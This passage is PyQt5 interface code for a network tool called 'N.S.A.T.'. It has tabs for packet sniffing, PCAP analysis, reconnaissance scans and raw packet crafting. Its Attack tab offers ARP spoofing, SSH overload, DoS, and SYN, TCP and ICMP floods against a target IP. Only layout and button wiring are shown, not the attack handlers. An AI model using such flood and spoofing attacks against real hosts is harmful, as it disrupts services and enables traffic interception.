        self.verticalLayout_13.addWidget(self.packetTypes)
        self.groupBox = QtWidgets.QGroupBox(self.pcapFilter)
        self.groupBox.setObjectName("groupBox")
        self.horizontalLayout_5 = QtWidgets.QHBoxLayout(self.groupBox)
        self.horizontalLayout_5.setObjectName("horizontalLayout_5")
        self.FileCheck = QtWidgets.QCheckBox(self.groupBox)
        self.FileCheck.setObjectName("FileCheck")
        self.horizontalLayout_5.addWidget(self.FileCheck)
        spacerItem34 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.horizontalLayout_5.addItem(spacerItem34)
        self.verticalLayout_13.addWidget(self.groupBox)
        self.groupBox_3 = QtWidgets.QGroupBox(self.pcapFilter)
        self.groupBox_3.setTitle("")
        self.groupBox_3.setObjectName("groupBox_3")
        self.horizontalLayout_7 = QtWidgets.QHBoxLayout(self.groupBox_3)
        self.horizontalLayout_7.setObjectName("horizontalLayout_7")
        self.horizontalLayout_6 = QtWidgets.QHBoxLayout()
        self.horizontalLayout_6.setObjectName("horizontalLayout_6")
        spacerItem35 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.horizontalLayout_6.addItem(spacerItem35)
        self.msg = QtWidgets.QMessageBox()
        self.msg.setIcon(QtWidgets.QMessageBox.Warning)
        self.msg.setText("Warning!")
        self.msg.setInformativeText("You provide missing information !")
        self.msg.setWindowTitle("Warning !")
        self.msg.setStandardButtons(QtWidgets.QMessageBox.Ok | QtWidgets.QMessageBox.Cancel)
        self.startButton = QtWidgets.QPushButton(self.groupBox_3)
        self.startButton.setObjectName("startButton")
        self.horizontalLayout_6.addWidget(self.startButton)
        self.analyze=QtGui.QIcon()
        self.analyze.addPixmap(QtGui.QPixmap("analyze.png"))
        self.startButton.setIcon(self.analyze)
        spacerItem36 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.horizontalLayout_6.addItem(spacerItem36)
        self.horizontalLayout_7.addLayout(self.horizontalLayout_6)
        self.verticalLayout_13.addWidget(self.groupBox_3)
        self.consequences = QtWidgets.QGroupBox(self.pcapFilter)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Preferred)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.consequences.sizePolicy().hasHeightForWidth())
        self.consequences.setSizePolicy(sizePolicy)
        self.consequences.setMaximumSize(QtCore.QSize(16777215, 16777000))
        self.consequences.setObjectName("consequences")
        self.gridLayout_10 = QtWidgets.QGridLayout(self.consequences)
        self.gridLayout_10.setObjectName("gridLayout_10")
        self.PResult = QtWidgets.QLabel(self.consequences)
        self.PResult.setObjectName("PResult")
        self.gridLayout_10.addWidget(self.PResult, 0, 0, 1, 1)
        self.FileResult = QtWidgets.QLabel(self.consequences)
        self.FileResult.setObjectName("FileResult")
        self.gridLayout_10.addWidget(self.FileResult, 0, 1, 1, 1)
        self.fileResult = QtWidgets.QTextEdit(self.consequences)
        self.fileResult.setTextInteractionFlags(QtCore.Qt.LinksAccessibleByKeyboard|QtCore.Qt.LinksAccessibleByMouse|QtCore.Qt.TextBrowserInteraction|QtCore.Qt.TextSelectableByKeyboard|QtCore.Qt.TextSelectableByMouse)
        self.fileResult.setObjectName("fileResult")
        self.gridLayout_10.addWidget(self.fileResult, 1, 1, 1, 1)
        self.textEdit_2 = QtWidgets.QTextEdit(self.consequences)
        self.textEdit_2.setTextInteractionFlags(QtCore.Qt.TextSelectableByKeyboard|QtCore.Qt.TextSelectableByMouse)
        self.textEdit_2.setObjectName("textEdit_2")
        self.gridLayout_10.addWidget(self.textEdit_2, 1, 0, 1, 1)
        self.verticalLayout_13.addWidget(self.consequences)
        self.Modules.addTab(self.pcapFilter,self.analyze, "")
        self.monitorW = QtWidgets.QWidget()
        self.monitorW.setObjectName("monitorW")
        self.verticalLayout_8 = QtWidgets.QVBoxLayout(self.monitorW)
        self.verticalLayout_8.setObjectName("verticalLayout_8")
        self.groupBox_5 = QtWidgets.QGroupBox(self.monitorW)
        self.groupBox_5.setObjectName("groupBox_5")
        self.gridLayout_14 = QtWidgets.QGridLayout(self.groupBox_5)
        self.gridLayout_14.setObjectName("gridLayout_14")
        self.m_dhcpbox = QtWidgets.QCheckBox(self.groupBox_5)
        self.m_dhcpbox.setObjectName("m_dhcpbox")
        self.gridLayout_14.addWidget(self.m_dhcpbox, 0, 0, 1, 1)
        self.m_icmpbox = QtWidgets.QCheckBox(self.groupBox_5)
        self.m_icmpbox.setObjectName("m_icmpbox")
        self.gridLayout_14.addWidget(self.m_icmpbox, 0, 1, 1, 1)
        self.m_ipbox = QtWidgets.QCheckBox(self.groupBox_5)
        self.m_ipbox.setObjectName("m_ipbox")
        self.gridLayout_14.addWidget(self.m_ipbox, 0, 2, 1, 1)
        self.m_tcpbox = QtWidgets.QCheckBox(self.groupBox_5)
        self.m_tcpbox.setObjectName("m_tcpbox")
        self.gridLayout_14.addWidget(self.m_tcpbox, 0, 3, 1, 1)
        self.m_udpbox = QtWidgets.QCheckBox(self.groupBox_5)
        self.m_udpbox.setObjectName("m_udpbox")
        self.gridLayout_14.addWidget(self.m_udpbox, 0, 4, 1, 1)
        self.m_dnsbox = QtWidgets.QCheckBox(self.groupBox_5)
        self.m_dnsbox.setObjectName("m_dnsbox")
        self.gridLayout_14.addWidget(self.m_dnsbox, 0, 5, 1, 1)
        self.m_arpbox = QtWidgets.QCheckBox(self.groupBox_5)
        self.m_arpbox.setObjectName("m_arpbox")
        self.gridLayout_14.addWidget(self.m_arpbox, 0, 6, 1, 1)
        self.allLabel = QtWidgets.QLabel(self.groupBox_5)
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.allLabel.setFont(font)
        self.allLabel.setStyleSheet("\n"
"color: rgb(0, 0, 127);")
        self.allLabel.setObjectName("allLabel")
        self.gridLayout_14.addWidget(self.allLabel, 1, 0, 1, 5)
        self.verticalLayout_8.addWidget(self.groupBox_5)
        self.FilterOpt = QtWidgets.QGroupBox(self.monitorW)
        self.FilterOpt.setObjectName("FilterOpt")
        self.gridLayout_15 = QtWidgets.QGridLayout(self.FilterOpt)
        self.gridLayout_15.setObjectName("gridLayout_15")
        self.m_srcIP = QtWidgets.QLabel(self.FilterOpt)
        self.m_srcIP.setMinimumSize(QtCore.QSize(100, 0))
        self.m_srcIP.setMaximumSize(QtCore.QSize(100, 16777215))
        self.m_srcIP.setObjectName("m_srcIP")
        self.gridLayout_15.addWidget(self.m_srcIP, 0, 0, 1, 1)
        self.im_srcIP = QtWidgets.QLineEdit(self.FilterOpt)
        self.im_srcIP.setMinimumSize(QtCore.QSize(100, 0))
        self.im_srcIP.setMaximumSize(QtCore.QSize(100, 16777215))
        self.im_srcIP.setObjectName("im_srcIP")
        self.gridLayout_15.addWidget(self.im_srcIP, 0, 1, 1, 1)
        self.m_dstIP = QtWidgets.QLabel(self.FilterOpt)
        self.m_dstIP.setMinimumSize(QtCore.QSize(100, 0))
        self.m_dstIP.setMaximumSize(QtCore.QSize(100, 16777215))
        self.m_dstIP.setObjectName("m_dstIP")
        self.gridLayout_15.addWidget(self.m_dstIP, 1, 0, 1, 1)
        self.im_dstIP = QtWidgets.QLineEdit(self.FilterOpt)
        self.im_dstIP.setMinimumSize(QtCore.QSize(100, 0))
        self.im_dstIP.setMaximumSize(QtCore.QSize(100, 16777215))
        self.im_dstIP.setObjectName("im_dstIP")
        self.gridLayout_15.addWidget(self.im_dstIP, 1, 1, 1, 1)
        self.m_part = QtWidgets.QLabel(self.FilterOpt)
        self.m_part.setMinimumSize(QtCore.QSize(100, 0))
        self.m_part.setMaximumSize(QtCore.QSize(100, 16777215))
        self.m_part.setObjectName("m_part")
        self.gridLayout_15.addWidget(self.m_part, 2, 0, 1, 1)
        self.im_port = QtWidgets.QLineEdit(self.FilterOpt)
        self.im_port.setMinimumSize(QtCore.QSize(100, 0))
        self.im_port.setMaximumSize(QtCore.QSize(100, 16777215))
        self.im_port.setInputMethodHints(QtCore.Qt.ImhNone)
        self.im_port.setObjectName("im_port")
        self.gridLayout_15.addWidget(self.im_port, 2, 1, 1, 1)
        self.verticalLayout_8.addWidget(self.FilterOpt)
        self.groupBox_8 = QtWidgets.QGroupBox(self.monitorW)
        self.groupBox_8.setTitle("")
        self.groupBox_8.setObjectName("groupBox_8")
        self.gridLayout_16 = QtWidgets.QGridLayout(self.groupBox_8)
        self.gridLayout_16.setObjectName("gridLayout_16")
        self.resolveBox = QtWidgets.QCheckBox(self.groupBox_8)
        self.resolveBox.setObjectName("resolveBox")
        self.gridLayout_16.addWidget(self.resolveBox, 0, 0, 1, 1)
        self.m_startB = QtWidgets.QPushButton(self.groupBox_8)
        self.m_startB.setMinimumSize(QtCore.QSize(200, 40))
        self.m_startB.setMaximumSize(QtCore.QSize(200, 40))
        self.m_startB.setObjectName("m_startB")
        self.sniff=QtGui.QIcon()
        self.sniff.addPixmap(QtGui.QPixmap("sniff.png"))
        self.m_startB.setIcon(self.sniff)
        self.gridLayout_16.addWidget(self.m_startB, 0, 1, 2, 1)
        self.saveBox = QtWidgets.QCheckBox(self.groupBox_8)
        self.saveBox.setObjectName("saveBox")
        self.gridLayout_16.addWidget(self.saveBox, 1, 0, 1, 1)
        self.verticalLayout_8.addWidget(self.groupBox_8)
        self.groupBox_7 = QtWidgets.QGroupBox(self.monitorW)
        self.groupBox_7.setObjectName("groupBox_7")
        self.gridLayout_11 = QtWidgets.QGridLayout(self.groupBox_7)
        self.gridLayout_11.setObjectName("gridLayout_11")
        self.textEdit_3 = QtWidgets.QTextEdit(self.groupBox_7)
        self.textEdit_3.setTextInteractionFlags(QtCore.Qt.LinksAccessibleByKeyboard|QtCore.Qt.LinksAccessibleByMouse|QtCore.Qt.TextBrowserInteraction|QtCore.Qt.TextSelectableByKeyboard|QtCore.Qt.TextSelectableByMouse)
        self.textEdit_3.setObjectName("textEdit_3")
        self.gridLayout_11.addWidget(self.textEdit_3, 0, 0, 1, 1)
        self.verticalLayout_8.addWidget(self.groupBox_7)
        self.Modules.addTab(self.monitorW,self.sniff, "")
        self.scanW = QtWidgets.QWidget()
        self.scanW.setObjectName("scanW")
        self.verticalLayout_9 = QtWidgets.QVBoxLayout(self.scanW)
        self.verticalLayout_9.setObjectName("verticalLayout_9")
        self.scanTypes = QtWidgets.QGroupBox(self.scanW)
        self.scanTypes.setObjectName("scanTypes")
        self.horizontalLayout_13 = QtWidgets.QHBoxLayout(self.scanTypes)
        self.horizontalLayout_13.setObjectName("horizontalLayout_13")
        self.subdomain = QtWidgets.QRadioButton(self.scanTypes)
        self.subdomain.setObjectName("subdomain")
        self.horizontalLayout_13.addWidget(self.subdomain)
        self.banner = QtWidgets.QRadioButton(self.scanTypes)
        self.banner.setObjectName("banner")
        self.horizontalLayout_13.addWidget(self.banner)
        self.traceroute = QtWidgets.QRadioButton(self.scanTypes)
        self.traceroute.setObjectName("traceroute")
        self.horizontalLayout_13.addWidget(self.traceroute)
        self.port = QtWidgets.QRadioButton(self.scanTypes)
        self.port.setObjectName("port")
        self.horizontalLayout_13.addWidget(self.port)
        self.verticalLayout_9.addWidget(self.scanTypes)
        self.scanOpt = QtWidgets.QGroupBox(self.scanW)
        self.scanOpt.setEnabled(True)
        self.scanOpt.setTitle("")
        self.scanOpt.setObjectName("scanOpt")
        self.verticalLayout_4 = QtWidgets.QVBoxLayout(self.scanOpt)
        self.verticalLayout_4.setObjectName("verticalLayout_4")
        self.gridLayout_6 = QtWidgets.QGridLayout()
        self.gridLayout_6.setObjectName("gridLayout_6")
        self.horizontalLayout_2 = QtWidgets.QHBoxLayout()
        self.horizontalLayout_2.setObjectName("horizontalLayout_2")
        self.verticalLayout_3 = QtWidgets.QVBoxLayout()
        self.verticalLayout_3.setObjectName("verticalLayout_3")
        self.s_targetIP = QtWidgets.QLabel(self.scanOpt)
        self.s_targetIP.setMinimumSize(QtCore.QSize(100, 0))
        self.s_targetIP.setMaximumSize(QtCore.QSize(100, 16777215))
        self.s_targetIP.setObjectName("s_targetIP")
        self.verticalLayout_3.addWidget(self.s_targetIP)
        self.s_port = QtWidgets.QLabel(self.scanOpt)
        self.s_port.setMinimumSize(QtCore.QSize(100, 0))
        self.s_port.setMaximumSize(QtCore.QSize(100, 16777215))
        self.s_port.setObjectName("s_port")
        self.verticalLayout_3.addWidget(self.s_port)
        self.s_dnsSer = QtWidgets.QLabel(self.scanOpt)
        self.s_dnsSer.setMinimumSize(QtCore.QSize(100, 0))
        self.s_dnsSer.setMaximumSize(QtCore.QSize(100, 16777215))
        self.s_dnsSer.setObjectName("s_dnsSer")
        self.verticalLayout_3.addWidget(self.s_dnsSer)
        self.horizontalLayout_2.addLayout(self.verticalLayout_3)
        self.verticalLayout_2 = QtWidgets.QVBoxLayout()
        self.verticalLayout_2.setObjectName("verticalLayout_2")
        self.is_targetIP = QtWidgets.QLineEdit(self.scanOpt)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Minimum, QtWidgets.QSizePolicy.Fixed)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.is_targetIP.sizePolicy().hasHeightForWidth())
        self.is_targetIP.setSizePolicy(sizePolicy)
        self.is_targetIP.setObjectName("is_targetIP")
        self.verticalLayout_2.addWidget(self.is_targetIP)
        self.horizontalLayout = QtWidgets.QHBoxLayout()
        self.horizontalLayout.setObjectName("horizontalLayout")
        self.is_port = QtWidgets.QLineEdit(self.scanOpt)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Maximum, QtWidgets.QSizePolicy.Fixed)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.is_port.sizePolicy().hasHeightForWidth())
        self.is_port.setSizePolicy(sizePolicy)
        self.is_port.setMaximumSize(QtCore.QSize(40, 20))
        self.is_port.setContextMenuPolicy(QtCore.Qt.ActionsContextMenu)
        self.is_port.setText("")
        self.is_port.setObjectName("is_port")
        self.horizontalLayout.addWidget(self.is_port)
        self.label = QtWidgets.QLabel(self.scanOpt)
        self.label.setMaximumSize(QtCore.QSize(40, 20))
        self.label.setObjectName("label")
        self.horizontalLayout.addWidget(self.label)
        self.is_port_2 = QtWidgets.QLineEdit(self.scanOpt)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Maximum, QtWidgets.QSizePolicy.Fixed)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.is_port_2.sizePolicy().hasHeightForWidth())
        self.is_port_2.setSizePolicy(sizePolicy)
        self.is_port_2.setMaximumSize(QtCore.QSize(40, 20))
        self.is_port_2.setContextMenuPolicy(QtCore.Qt.ActionsContextMenu)
        self.is_port_2.setObjectName("is_port_2")
        self.horizontalLayout.addWidget(self.is_port_2)
        self.verticalLayout_2.addLayout(self.horizontalLayout)
        self.is_dnsSer = QtWidgets.QLineEdit(self.scanOpt)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Minimum, QtWidgets.QSizePolicy.Fixed)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.is_dnsSer.sizePolicy().hasHeightForWidth())
        self.is_dnsSer.setSizePolicy(sizePolicy)
        self.is_dnsSer.setObjectName("is_dnsSer")
        self.verticalLayout_2.addWidget(self.is_dnsSer)
        self.horizontalLayout_2.addLayout(self.verticalLayout_2)
        self.gridLayout_6.addLayout(self.horizontalLayout_2, 0, 0, 1, 1)
        spacerItem37 = QtWidgets.QSpacerItem(40, 20, QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Minimum)
        self.gridLayout_6.addItem(spacerItem37, 0, 1, 1, 1)
        self.scanB = QtWidgets.QPushButton(self.scanOpt)
        self.scanB.setMaximumSize(QtCore.QSize(90, 16777215))
        self.scanB.setObjectName("scanB")
        self.recon=QtGui.QIcon()
        self.recon.addPixmap(QtGui.QPixmap("recon.png"))
        self.scanB.setIcon(self.recon)
        self.gridLayout_6.addWidget(self.scanB, 1, 0, 1, 1)
        self.verticalLayout_4.addLayout(self.gridLayout_6)
        self.verticalLayout_9.addWidget(self.scanOpt)
        self.scanResult = QtWidgets.QGroupBox(self.scanW)
        self.scanResult.setObjectName("scanResult")
        self.gridLayout_12 = QtWidgets.QGridLayout(self.scanResult)
        self.gridLayout_12.setObjectName("gridLayout_12")
        self.textEdit = QtWidgets.QTextEdit(self.scanResult)
        self.textEdit.setTextInteractionFlags(QtCore.Qt.LinksAccessibleByKeyboard|QtCore.Qt.LinksAccessibleByMouse|QtCore.Qt.TextBrowserInteraction|QtCore.Qt.TextSelectableByKeyboard|QtCore.Qt.TextSelectableByMouse)
        self.textEdit.setObjectName("textEdit")
        self.gridLayout_12.addWidget(self.textEdit, 0, 0, 1, 1)
        self.verticalLayout_9.addWidget(self.scanResult)
        self.Modules.addTab(self.scanW,self.recon, "")
        self.gridLayout.addWidget(self.Modules, 0, 0, 1, 1)
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Minimum, QtWidgets.QSizePolicy.Minimum)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.label_2.sizePolicy().hasHeightForWidth())
        self.label_2.setSizePolicy(sizePolicy)
        self.label_2.setMaximumSize(QtCore.QSize(650, 16777215))
        font = QtGui.QFont()
        font.setPointSize(9)
        font.setBold(True)
        font.setWeight(75)
        self.label_2.setFont(font)
        self.label_2.setStyleSheet("color: rgb(0, 0, 127);")
        self.label_2.setObjectName("label_2")
        self.gridLayout.addWidget(self.label_2, 1, 0, 1, 1)
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 667, 19))
        self.menubar.setObjectName("menubar")
        MainWindow.setMenuBar(self.menubar)

        self.retranslateUi(MainWindow)
        self.Modules.setCurrentIndex(0)
        self.ptypesTab.setCurrentIndex(0)
        self.allPacketbox.toggled['bool'].connect(self.ipbox.setDisabled)
        self.allPacketbox.toggled['bool'].connect(self.udpbox.setDisabled)
        self.allPacketbox.toggled['bool'].connect(self.tcpbox.setDisabled)
        self.allPacketbox.toggled['bool'].connect(self.icmpbox.setDisabled)
        self.allPacketbox.toggled['bool'].connect(self.arpbox.setDisabled)
        self.allPacketbox.toggled['bool'].connect(self.dhcpbox.setDisabled)
        self.ddos.toggled['bool'].connect(self.itargetPort.setDisabled)
        self.ddos.toggled['bool'].connect(self.ipacketNumber.setDisabled)
        self.aSpoof.toggled['bool'].connect(self.itargetPort.setDisabled)
        self.tFlood.toggled['bool'].connect(self.itargetPort.setDisabled)
        self.tFlood.toggled['bool'].connect(self.ipacketNumber.setDisabled)
        self.sshOver.toggled['bool'].connect(self.itargetPort.setDisabled)
        self.sshOver.toggled['bool'].connect(self.ipacketNumber.setDisabled)
        self.iFlood.toggled['bool'].connect(self.itargetPort.setDisabled)
        self.Fuzzer.toggled['bool'].connect(self.itargetPort.setDisabled)
        self.Fuzzer.toggled['bool'].connect(self.ipacketNumber.setDisabled)
        self.subdomain.toggled['bool'].connect(self.is_port_2.setDisabled)
        self.subdomain.toggled['bool'].connect(self.is_port.setDisabled)
        self.traceroute.toggled['bool'].connect(self.is_port.setDisabled)
        self.traceroute.toggled['bool'].connect(self.is_dnsSer.setDisabled)
        self.banner.toggled['bool'].connect(self.is_port.setDisabled)
        self.traceroute.toggled['bool'].connect(self.is_port_2.setDisabled)
        self.port.toggled['bool'].connect(self.is_dnsSer.setDisabled)
        self.banner.toggled['bool'].connect(self.is_port_2.setDisabled)
        self.banner.toggled['bool'].connect(self.is_dnsSer.setDisabled)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)
        self.attackB.clicked.connect(attack_B)
        self.arpSend.clicked.connect(arp_Send)
        self.tcpSend.clicked.connect(tcp_Send)
        self.udpSend.clicked.connect(udp_Send)
        self.ipSend.clicked.connect(ip_Send)
        self.icmpSend.clicked.connect(icmp_Send)
        self.dnsSend.clicked.connect(dns_Send)
        self.scanB.clicked.connect(recon)
        self.m_startB.clicked.connect(sniffer)
        self.startButton.clicked.connect(analyzer)


    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "N.S.A.T."))
        self.attackW.setToolTip(_translate("MainWindow", "<html><head/><body><p><br/></p></body></html>"))
        self.aOpt.setTitle(_translate("MainWindow", "Attack Inputs"))
        self.targetIp.setText(_translate("MainWindow", "Target IP"))
        self.itargetIP.setPlaceholderText(_translate("MainWindow", "192.168.1.1"))
        self.targetPort.setText(_translate("MainWindow", "Target Port"))
        self.itargetPort.setPlaceholderText(_translate("MainWindow", "80"))
        self.packetNumber.setText(_translate("MainWindow", "# of"))
        self.aTypes.setTitle(_translate("MainWindow", "Attack Types"))
        self.Fuzzer.setText(_translate("MainWindow", "Fuzzer"))
        self.aSpoof.setText(_translate("MainWindow", "ARP Spoof"))
        self.sshOver.setText(_translate("MainWindow", "SSH Overload"))
        self.ddos.setText(_translate("MainWindow", "DoS"))
        self.tFlood.setText(_translate("MainWindow", "TCP Flood"))
        self.iFlood.setText(_translate("MainWindow", "ICMP Flood"))
        self.sFlood.setText(_translate("MainWindow", "SYN Flood"))
        self.attackB.setText(_translate("MainWindow", "Attack"))
        self.Modules.setTabText(self.Modules.indexOf(self.attackW), _translate("MainWindow", "Attack"))
        self.label_ptypes.setText(_translate("MainWindow", "Packet Types"))
        self.arpOpt.setTitle(_translate("MainWindow", "Packet Options"))
        self.arpSrcIP.setText(_translate("MainWindow", "Source IP"))
        self.arpOp.setText(_translate("MainWindow", "Op - Code"))
        self.iarpHw.setPlaceholderText(_translate("MainWindow", "1"))
        self.arpPlength.setText(_translate("MainWindow", "Protocol Length"))
        self.arpHw.setText(_translate("MainWindow", "Hardware Type"))
        self.iarpOp.setPlaceholderText(_translate("MainWindow", "0"))
        self.arpPro.setText(_translate("MainWindow", "Protocol Type"))
        self.arpSend.setText(_translate("MainWindow", "Send "))
        self.iarpProLength.setPlaceholderText(_translate("MainWindow", "4"))
        self.iarpPtype.setPlaceholderText(_translate("MainWindow", "8"))
        self.iarpSrcIP.setPlaceholderText(_translate("MainWindow", "192.168.1.2"))
        self.iarpSrcMac.setPlaceholderText(_translate("MainWindow", "aa:bb:cc:11:22:33"))
        self.arpSrcMac.setText(_translate("MainWindow", "Source MAC"))
        self.arpDest.setText(_translate("MainWindow", "Destination IP"))
        self.iarpDestIP.setPlaceholderText(_translate("MainWindow", "192.168.1.1"))
        self.ptypesTab.setTabText(self.ptypesTab.indexOf(self.arpPage), _translate("MainWindow", "ARP"))
        self.tcpDstPort.setText(_translate("MainWindow", "Destination Port"))
        self.itcpFlag.setPlaceholderText(_translate("MainWindow", "\'S\'"))
        self.tcpCheck.setText(_translate("MainWindow", "Checksum"))
        self.itcpDstPort.setPlaceholderText(_translate("MainWindow", "80"))
        self.tcpSeq.setText(_translate("MainWindow", "Seq Number"))
        self.tcpAck.setText(_translate("MainWindow", "Ack Number"))
        self.tcpRes.setText(_translate("MainWindow", "Reserved"))
        self.tcpDestIP.setText(_translate("MainWindow", "Destination IP"))
        self.itcpSeq.setPlaceholderText(_translate("MainWindow", "0"))
        self.tcpFlag.setText(_translate("MainWindow", "Flags"))
        self.tcpSrcPort.setText(_translate("MainWindow", "Source Port"))
        self.tcpSend.setText(_translate("MainWindow", "Send"))
        self.itcpOff.setPlaceholderText(_translate("MainWindow", "None"))
        self.tcpUrg.setText(_translate("MainWindow", "Urgent Pointer"))
        self.tcpWindow.setText(_translate("MainWindow", "Window"))
        self.itcpDstIP.setPlaceholderText(_translate("MainWindow", "192.168.1.1"))
        self.itcpCheck.setPlaceholderText(_translate("MainWindow", "None"))
        self.itcpUrg.setPlaceholderText(_translate("MainWindow", "0"))
        self.tcpOff.setText(_translate("MainWindow", "Data Offset"))
        self.itcpRes.setPlaceholderText(_translate("MainWindow", "0"))
        self.itcpSrcPort.setPlaceholderText(_translate("MainWindow", "21"))
        self.itcpAck.setPlaceholderText(_translate("MainWindow", "0"))
        self.itcpWin.setPlaceholderText(_translate("MainWindow", "8192"))
        self.ptypesTab.setTabText(self.ptypesTab.indexOf(self.tcpPage), _translate("MainWindow", "TCP"))
        self.udpCheck.setText(_translate("MainWindow", "Checksum"))
        self.udpLength.setText(_translate("MainWindow", "Length"))
        self.udpSrcPort.setText(_translate("MainWindow", "Source Port"))
        self.iudpSrcPort.setPlaceholderText(_translate("MainWindow", "21"))
        self.udpDstPort.setText(_translate("MainWindow", "Destination Port"))
        self.iudpLength.setPlaceholderText(_translate("MainWindow", "None"))
        self.iudpCheck.setPlaceholderText(_translate("MainWindow", "None"))
        self.iudpDstPort.setPlaceholderText(_translate("MainWindow", "80"))
        self.udpSend.setText(_translate("MainWindow", "Send"))
        self.arpDest_2.setText(_translate("MainWindow", "Destination IP"))
        self.iarpDestIP_2.setPlaceholderText(_translate("MainWindow", "192.168.1.1"))
        self.ptypesTab.setTabText(self.ptypesTab.indexOf(self.udpPage), _translate("MainWindow", "UDP"))
        self.i_ipHead.setPlaceholderText(_translate("MainWindow", "None"))
        self.ipVer.setText(_translate("MainWindow", "IP Version"))
        self.i_ipFrag.setPlaceholderText(_translate("MainWindow", "0"))
        self.i_ipFlag.setPlaceholderText(_translate("MainWindow", "None"))
        self.ipHead.setText(_translate("MainWindow", "Header Length"))
        self.ipTos.setText(_translate("MainWindow", "Type of Service"))
        self.i_ipLen.setPlaceholderText(_translate("MainWindow", "None"))
        self.ipLen.setText(_translate("MainWindow", "Length"))
        self.ipSend.setText(_translate("MainWindow", "Send"))
        self.ipFlag.setText(_translate("MainWindow", "Flags"))
        self.ipFrag.setText(_translate("MainWindow", "Fragment Offset"))
        self.i_ipTos.setPlaceholderText(_translate("MainWindow", "0"))
        self.i_ipIden.setPlaceholderText(_translate("MainWindow", "1"))
        self.ipIden.setText(_translate("MainWindow", "Identification"))
        self.i_ipVer.setPlaceholderText(_translate("MainWindow", "4"))
        self.ipDstIP.setText(_translate("MainWindow", "Destination IP"))
        self.i_ipSrcIP.setPlaceholderText(_translate("MainWindow", "192.168.1.2"))
        self.ipSrcIP.setText(_translate("MainWindow", "Source IP"))
        self.i_ipDstIP.setPlaceholderText(_translate("MainWindow", "192.168.1.1"))
        self.ipPro.setText(_translate("MainWindow", "Protocol"))
        self.i_ipProto.setPlaceholderText(_translate("MainWindow", "1"))
        self.ipTtl.setText(_translate("MainWindow", "Time to Live"))
        self.i_ipTtl.setPlaceholderText(_translate("MainWindow", "64"))
        self.i_ipCheck.setPlaceholderText(_translate("MainWindow", "None"))
        self.ipCheck.setText(_translate("MainWindow", "Checksum"))
        self.ptypesTab.setTabText(self.ptypesTab.indexOf(self.ipPage), _translate("MainWindow", "IP"))
        self.icmpSend.setText(_translate("MainWindow", "Send"))
        self.icmpCode.setText(_translate("MainWindow", "Code"))
        self.i_icmpCode.setPlaceholderText(_translate("MainWindow", "0"))
        self.i_icmpCheck.setPlaceholderText(_translate("MainWindow", "None"))
        self.icmpSeg.setText(_translate("MainWindow", "Seq"))
        self.i_icmpType.setPlaceholderText(_translate("MainWindow", "0"))
        self.icmpCheck.setText(_translate("MainWindow", "Checksum"))
        self.icmpId.setText(_translate("MainWindow", "ID"))
        self.icmpType.setText(_translate("MainWindow", "Type"))
        self.i_icmpId.setPlaceholderText(_translate("MainWindow", "0"))
        self.i_icmpSeq.setPlaceholderText(_translate("MainWindow", "0"))
        self.icmpDespIP.setText(_translate("MainWindow", "Destination IP"))
        self.icmpSrcIP.setText(_translate("MainWindow", "Source IP"))
        self.i_icmpSrcIP.setPlaceholderText(_translate("MainWindow", "192.168.1.2"))
        self.i_icmpDestIP.setPlaceholderText(_translate("MainWindow", "192.168.1.1"))
        self.ptypesTab.setTabText(self.ptypesTab.indexOf(self.icmpPage), _translate("MainWindow", "ICMP"))
        self.dnsQuRec.setText(_translate("MainWindow", "Question Record Count"))
        self.dnsResp.setText(_translate("MainWindow", "Response Code"))
        self.idnsqd.setPlaceholderText(_translate("MainWindow", "0"))
        self.dnsQRes.setText(_translate("MainWindow", "Query Response"))
        self.dnsAddRec.setText(_translate("MainWindow", "Additional Record Count"))
        self.dnsRecAv.setText(_translate("MainWindow", "Recursion Available"))
        self.idnsResCode.setPlaceholderText(_translate("MainWindow", "0"))
        self.dnsqd.setText(_translate("MainWindow", "qd"))
        self.idnsRecDes.setPlaceholderText(_translate("MainWindow", "0"))
        self.dnsAnsRec.setText(_translate("MainWindow", "Answer Record Count"))
        self.dnsAutRec.setText(_translate("MainWindow", "Authority Record Count"))
        self.dnsan.setText(_translate("MainWindow", "an"))
        self.dnsar.setText(_translate("MainWindow", "ar"))
        self.idnsns.setPlaceholderText(_translate("MainWindow", "0"))
        self.idnsAddRec.setPlaceholderText(_translate("MainWindow", "0"))
        self.dnsRecDes.setText(_translate("MainWindow", "Recursion Desired"))
        self.dnsOp.setText(_translate("MainWindow", "Opcode"))
        self.dnsAutAns.setText(_translate("MainWindow", "Authoritative Answer"))
        self.idnsan.setPlaceholderText(_translate("MainWindow", "0"))
        self.dnsSend.setText(_translate("MainWindow", "Send"))
        self.idnsOp.setPlaceholderText(_translate("MainWindow", "1"))
